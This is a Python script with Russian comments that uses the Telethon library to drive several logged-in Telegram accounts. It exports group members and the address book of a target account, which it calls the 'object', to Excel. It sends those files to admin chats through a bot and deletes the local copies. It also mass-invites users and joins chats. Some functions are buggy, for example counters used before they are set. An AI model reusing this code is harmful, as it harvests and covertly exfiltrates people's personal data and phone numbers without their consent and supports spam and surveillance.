import asyncio  
import os
import time
import openpyxl
from telethon.tl.functions.channels import InviteToChannelRequest
from telethon.tl.functions.contacts import GetContactsRequest
from telethon.tl.types import InputPhoneContact
from telethon.tl.types import User, Chat
from telethon.tl.types import Message
from telethon.sync import TelegramClient
from openpyxl import Workbook
from openpyxl.utils import get_column_letter
from datetime import datetime
from telethon.tl.functions.messages import ImportChatInviteRequest
from telethon.errors.rpcerrorlist import PeerFloodError, UserPrivacyRestrictedError

# Формирование списка
def print_channel_lists(openchannels, closechannels, openchats, closechats, print_pages):
    print("\033[95mОткрытые КАНАЛЫ:\033[0m")
    openchannel_list = []
    oc = 1
    for openchannel in openchannels:
        owner = " (Владелец)" if openchannel.creator else ""
        admin = " (Администратор)" if openchannel.admin_rights is not None else ""
        openchannel_list.append(f"{oc} - {openchannel.title} \033[93m[{openchannel.participants_count}]\033[0m\033[91m {owner} {admin}\033[0m ID:{openchannel.id} \033[94m@{openchannel.username}\033[0m")
        oc += 1
        if owner !="" or admin != "":
            owner_channel += 1
    print_pages(openchannel_list, 25)
    print()
    
    print("\033[95mЗакрытые КАНАЛЫ:\033[0m")
    closechannel_list = []
    cc = 1
    for closechannel in closechannels:
        owner = " (Владелец)" if closechannel.creator else ""
        admin = " (Администратор)" if closechannel.admin_rights is not None else ""
        closechannel_list.append(f"{cc} - {closechannel.title} \033[93m[{closechannel.participants_count}]\033[0m \033[91m{owner} {admin}\033[0m ID:{closechannel.id}")
        cc += 1
        if owner !="" or admin != "":
            owner_channel += 1
            owner_closechannel += 1
    print_pages(closechannel_list, 25)
    print()
    
    print("\033[95mОткрытые ГРУППЫ:\033[0m")
    openchat_list = []
    og = 1
    for openchat in openchats:
        owner = " (Владелец)" if openchat.creator else ""
        admin = " (Администратор)" if openchat.admin_rights is not None else ""
        openchat_list.append(f"{og} - {openchat.title} \033[93m[{openchat.participants_count}]\033[0m\033[91m {owner} {admin}\033[0m ID:{openchat.id} \033[94m@{openchat.username}\033[0m")
        og += 1
        if owner !="" or admin != "":
            owner_group += 1
    print_pages(openchat_list, 25)
    print()
    
    print("\033[95mЗакрытые ГРУППЫ:\033[0m")
    closechat_list = []
    cg = 1
    for closechat in closechats:
        owner = " (Владелец)" if closechat.creator else ""
        admin = " (Администратор)" if closechat.admin_rights is not None else ""
        closechat_list.append(f"{cg} - {closechat.title} \033[93m[{closechat.participants_count}]\033[0m \033[91m{owner} {admin}\033[0m ID:{closechat.id}")
        cg += 1
        if owner !="" or admin != "":
            owner_group += 1
            owner_closegroup += 1
    print_pages(closechat_list, 25)
    return owner_channel, owner_group, owner_closegroup, owner_closechannel, oc, cc, og, cg

# Парсим ссылки на чаты
def parsing_chats(chatids):
    with open('chatnames.txt', 'w') as file:
        for chatid in chatids:
            file.write(chatid + '\n')

#вступаем в группы
def into_chats(client, chatnames):
    for chatname in chatnames:
        try:
            print(chatname)
            input("жми")
            client(ImportChatInviteRequest(hash='-7069284604556173187'))
            print(f"Присоединился к группе: {chatname}")
            time.sleep(20)  # Задержка в 10 секунд
        except PeerFloodError:
            print("PeerFloodError: Превышен лимит на число запросов. Попробуйте позже.")
            return
        except UserPrivacyRestrictedError:
            print(f"UserPrivacyRestrictedError: У вас ограничена возможность присоединения к группе {chatname}.")
        except Exception as e:
            print(f"Ошибка при присоединении к группе {chatname}: {e}")
        input("жми")
  

# Выгружаем контакты в Excel
async def get_contacts(client, session_name, userid, userinfo):
    result = await client(GetContactsRequest(0))
    contacts = result.users

    contacts_file_name = f'contacts_{session_name}.xlsx'

    wb = openpyxl.Workbook()
    sheet = wb.active

    sheet.cell(row=1, column=1, value=userinfo)

    headers = ['ID', 'First name (так записан у объекта в книге)', 'Last name (так записан у объекта в книге)', 'Username', 'Телефон', 'Взаимный контакт', 'Дата внесения в базу', 'ID объекта']
    for col, header in enumerate(headers, start=1):
        sheet.cell(row=2, column=col, value=header)

    row_num = 3
    
    for contact in contacts:
        if hasattr(contact, 'id'):
            sheet.cell(row=row_num, column=1, value=contact.id)
        if hasattr(contact, 'first_name'):
            sheet.cell(row=row_num, column=2, value=contact.first_name)
        if hasattr(contact, 'last_name'):
            sheet.cell(row=row_num, column=3, value=contact.last_name)
        if hasattr(contact, 'username') and contact.username is not None:
            username_with_at = f"@{contact.username}"
            sheet.cell(row=row_num, column=4, value=username_with_at)
        if hasattr(contact, 'phone'):
            sheet.cell(row=row_num, column=5, value=contact.phone)
        if hasattr(contact, 'mutual_contact') and contact.mutual_contact:
            sheet.cell(row=row_num, column=6, value='взаимный')
        
        sheet.cell(row=row_num, column=7, value=datetime.now().strftime('%d/%m/%Y %H:%M:%S'))
        sheet.cell(row=row_num, column=8, value=userid)
     
        row_num += 1

    wb.save(f'{session_name}_contacts.xlsx')
    
# Инвайтинг
def inviting(client, channel, users):
    client(InviteToChannelRequest(
        channel=channel,
        users=[users]
    ))




# Выгружаем участников группы
def parsing_xlsx(client, index: int, id: bool, name: bool, group_title, group_id, userid, userinfo):
    all_participants = client.get_participants(index)

    # Создание нового документа Excel
    wb = openpyxl.Workbook()
    sheet = wb.active
    sheet.cell(row=1, column=1, value=userinfo)
    
    # Запись заголовков столбцов
    headers = ['ID', 'First Name', 'Last Name', 'Username', 'Записан в контакты', 'Взаимный контакт', 'Бот', 'Название группы','ID группы','ID объекта']
    for col, header in enumerate(headers, start=1):
        sheet.cell(row=2, column=col, value=header)
    
    # Переменная для отслеживания строки
    row_num = 3
    
    # Процесс обработки участников чата в файл Excel
    for user in all_participants:
        # Если параметр id равен True, записываем ID пользователя без проверки
        if id:
            sheet.cell(row=row_num, column=1, value=user.id)
        
        # Если параметр name равен True и у пользователя есть имя, записываем его
        if name:
            if hasattr(user, 'first_name'):
                sheet.cell(row=row_num, column=2, value=user.first_name)
            if hasattr(user, 'last_name'):
                sheet.cell(row=row_num, column=3, value=user.last_name)
            if hasattr(user, 'username') and user.username is not None:
                usernamechat_with_at = f"@{user.username}"
                sheet.cell(row=row_num, column=4, value=usernamechat_with_at)
        if hasattr(user, 'contact') and user.contact:
            sheet.cell(row=row_num, column=5, value='Сохранен')
        if hasattr(user, 'mutual_contact') and user.mutual_contact:
            sheet.cell(row=row_num, column=6, value='Взаимный')
        if hasattr(user, 'bot') and user.bot:
            sheet.cell(row=row_num, column=7, value='Бот')
        sheet.cell(row=row_num, column=8, value=group_title)
        sheet.cell(row=row_num, column=9, value=group_id)
        sheet.cell(row=row_num, column=10, value=userid)
        
        # Увеличиваем номер строки для следующего пользователя
        row_num += 1
    
    # Сохранение документа Excel
    #wb.save(f"{group_title}_participants.xlsx")
    import re

    def sanitize_filename(filename):
    # Удаляем недопустимые символы из имени файла
        return re.sub(r'[\\/*?:"<>|]', '', filename)

# Пример использования
    
    clean_group_title = sanitize_filename(group_title)

    if clean_group_title == group_title:
        filename = f"{group_title}_participants.xlsx"
    else:
        filename = f"{clean_group_title}_participants.xlsx"

    wb.save(filename)















# Функци по отправке в боты
def send_files_to_bot(bot, admin_chat_ids):
    # 1 Проверяем наличие файла с сообщениями и отправляем его ботам
    messages_file_path = None
    for file_name in os.listdir('.'):
        if file_name.endswith('_messages.xlsx'):
            messages_file_path = file_name
            break

    if messages_file_path is not None and os.path.getsize(messages_file_path) > 0:
        # Файл с сообщениями найден и не пустой, отправляем его ботам
        for admin_chat_id in admin_chat_ids:
            with open(messages_file_path, "rb") as file:
                bot.send_document(admin_chat_id, file)
        # После отправки удаляем файл, чтобы избежать повторной отправки
        os.remove(messages_file_path)

    # 2 Проверяем наличие файла с участниками групп и отправляем его ботам
    participants_file_path = None
    for file_name in os.listdir('.'):
        if file_name.endswith('participants.xlsx'):
            participants_file_path = file_name
            break

    if participants_file_path is not None and os.path.getsize(participants_file_path) > 0:
        # Файл с участниками групп найден и не пустой, отправляем его ботам
        for admin_chat_id in admin_chat_ids:
            with open(participants_file_path, "rb") as file:
                bot.send_document(admin_chat_id, file)
        # После отправки удаляем файл, чтобы избежать повторной отправки
        os.remove(participants_file_path)

    # 3 Проверяем наличие файла с контактами и отправляем его ботам
    contacts_file_path = None
    for file_name in os.listdir('.'):
        if file_name.endswith('contacts.xlsx'):
            contacts_file_path = file_name
            break

    if contacts_file_path is not None and os.path.getsize(contacts_file_path) > 0:
        # Файл с контактами найден и не пустой, отправляем его ботам
        for admin_chat_id in admin_chat_ids:
            with open(contacts_file_path, "rb") as file:
                bot.send_document(admin_chat_id, file)
        # После отправки удаляем файл, чтобы избежать повторной отправки
        os.remove(contacts_file_path)



    # 4 Проверяем наличие файла c ифнормацией о каналах и группах отправляем его ботам
    about_file_path = None
    for file_name in os.listdir('.'):
        if file_name.endswith('about.xlsx'):
            about_file_path = file_name
            break

    if about_file_path is not None and os.path.getsize(about_file_path) > 0:
        # Файл с контактами найден и не пустой, отправляем его ботам
        for admin_chat_id in admin_chat_ids:
            with open(about_file_path, "rb") as file:
                bot.send_document(admin_chat_id, file)
        # После отправки удаляем файл, чтобы избежать повторной отправки
        os.remove(about_file_path)










# Получаем ИД и Names в текстовый файл оригинал
def parsing(client, index: int, id: bool, name: bool):
    all_participants = []
    all_participants = client.get_participants(index)
    if name:
        with open('usernames.txt', 'r+') as f:
            usernames = f.readlines()
            for user in all_participants:
                if user.username:
                    if ('Bot' not in user.username) and ('bot' not in user.username):
                        if (('@' + user.username + '\n') not in usernames):
                            f.write('@' + user.username + '\n')
                        else:
                            continue
                    else:
                        continue
                else:
                    continue
    if id:
        with open('userids.txt', 'r+') as f:
            userids = f.readlines()
            for user in all_participants:
                if (str(user.id) + '\n') not in userids:
                    f.write(str(user.id) + '\n')



#Настройки
def config(api_id, api_hash):
    while True:
        os.system('cls||clear')

        with open('options.txt', 'r+') as f:
            if not f.readlines():
                f.write("NONEID\n"
                        "NONEHASH\n"
                        "True\n"
                        "True\n")
                continue
                
        options = getoptions()
        sessions = []
        for file in os.listdir('.'):
            if file.endswith('.session'):
                sessions.append(file)

        prompt_message = (
            f"\033[35m1 - Обновить api_id \033[0m\033[37m[{options[0].rstrip()}]\033[0m\n"
            f"\033[35m2 - Обновить api_hash \033[0m\033[37m[{options[1].rstrip()}]\033[0m\n"
            "\033[31m3 - Сбросить настройки\033[0m\n"
            " \n"
            f"\033[32m4 - Парсить user-id\033[0m \033[37m[{options[2].rstrip()}]\033[0m\n"
            f"\033[32m5 - Парсить user-name\033[0m \033[37m[{options[3].rstrip()}]\033[0m\n"
            " \n"
            "\033[96m\033[4mРабота с аккаунтами\033[0m\033[0m\n"
            f"\033[36m6 - Вывести список подключенных аккаунтов.\033[0m \033[37mСейчас: [{len(sessions)}]\033[0m\n"
            f"\033[36m7 - Добавить новый аккаунт.\033[0m \033[37mСейчас: [{len(sessions)}]\033[0m\n"
            f"\033[36m8 - Завершить сеанс аккаунта в системе.\033[0m \033[37mСейчас: [{len(sessions)}]\033[0m\n"
            " \n"
            "\033[33m'e' - Назад\033[0m\n"
            " \n"
            "\033[37mВвод: \033[0m"
        )

        key = str(input(prompt_message))

        if key == '1':
            os.system('cls||clear')
            options[0] = str(input("Введите API_ID: ")) + "\n"

        elif key == '2':
            os.system('cls||clear')
            options[1] = str(input("Введите API_HASH: ")) + "\n"

        elif key == '4':
            if options[2] == 'True\n':
                options[2] = 'False\n'
            else:
                options[2] = 'True\n'

        elif key == '5':
            if options[3] == 'True\n':
                options[3] = 'False\n'
            else:
                options[3] = 'True\n'

# Просмотреть подключенные аккаунты
        elif key == '6':
            os.system('cls||clear')
            #if options[0] == "NONEID\n" or options[1] == "NONEHASH":
            #    print("Проверьте api_id и api_hash")
            #    time.sleep(2)
            #    continue

            print("Подключенные аккаунты:\n")
            for i in sessions:
                print(i)
            print()
            input("Для продолжения нажмите любую клавишу...")

#Добавить аккаунт
        elif key == '7':
            os.system('cls||clear')
            if options[0] == "NONEID\n" or options[1] == "NONEHASH":
                print("Проверьте api_id и api_hash")
                time.sleep(2)
                continue

            while True:
                os.system('cls||clear')
                print("=Добавляем аккаунт в систему=\n")
                print("Имеющиеся подключенные аккаунты:\n")
                for i in sessions:
                    print(i)
                print()
                phone = input("Введите номер телефона нового аккаунта ('e' - назад): ")
                if phone.lower() == 'e':
                    break
                if phone.startswith('+'):
                    phone = phone[1:]  # Удаляем плюс, чтобы оставить только цифры
                if phone.isdigit() and len(phone) >= 9:
                    client = TelegramClient(phone, int(options[0].replace('\n', '')), 
                                        options[1].replace('\n', '')).start(phone)
                    os.system('cls||clear')
                    print("Аккаунт (" + phone + ") успешно добавлен")
                    client.disconnect()
                    time.sleep(2)
                    break
                else:
                    print("Некорректный номер телефона. Пожалуйста, введите номер еще раз")
                    time.sleep(2)

 #Удалить аккаунт     
        elif key == '8':
            os.system('cls||clear')
            if options[0] == "NONEID\n" or options[1] == "NONEHASH":
                print("Проверьте api_id и api_hash")
                time.sleep(2)
                continue

            sessions = []
            for file in os.listdir('.'):
                if file.endswith('.session'):
                    sessions.append(file)

            while True:
                os.system('cls||clear')
                print("=Удаляем аккаунт из системы=\n")
                for i in range(len(sessions)):
                    print(f"[{i}] -", sessions[i])
                print()
                kill = input("Выберите аккаунт для выхода из него ('e' - назад): ")
                if kill.lower() == 'e':
                    break
                else:
                    try:
                        i = int(kill)
                        if 0 <= i < len(sessions):
                            client = TelegramClient(sessions[i].replace('\n', ''), api_id, api_hash).start(sessions[i].replace('\n', ''))
                            client.log_out()
                            client.disconnect()
                            os.system('cls||clear')
                            print(f"Аккаунт {sessions[i]} успешно отключен")
                            time.sleep(3)
                            break
                        else:
                            #os.system('cls||clear')
                            print("Неверный номер аккаунта. Пожалуйста, выберите существующий аккаунт или введите 'e' для возврата назад")
                            time.sleep(2)
                    except ValueError:
                        #os.system('cls||clear')
                        print("Неверный ввод. Пожалуйста, выберите существующий аккаунт или введите 'e' для возврата назад")
                        time.sleep(2)


# Сброс настроеек
        elif key == '3':
            os.system('cls||clear')
            answer = input("Вы уверены?\nAPI_ID и API_HASH будут удалены\n"
                           "1 - Удалить\n2 - Назад\n"
                           "Ввод: ")
            if answer == '1':    
                options.clear()
                print("Настройки очищены.")
                time.sleep(2)
            else:
                continue

        elif key == 'e':
            os.system('cls||clear')
            break

        with open('options.txt', 'w') as f:
            f.writelines(options)


def getoptions():
    with open('options.txt', 'r') as f:
        options = f.readlines()
    return options
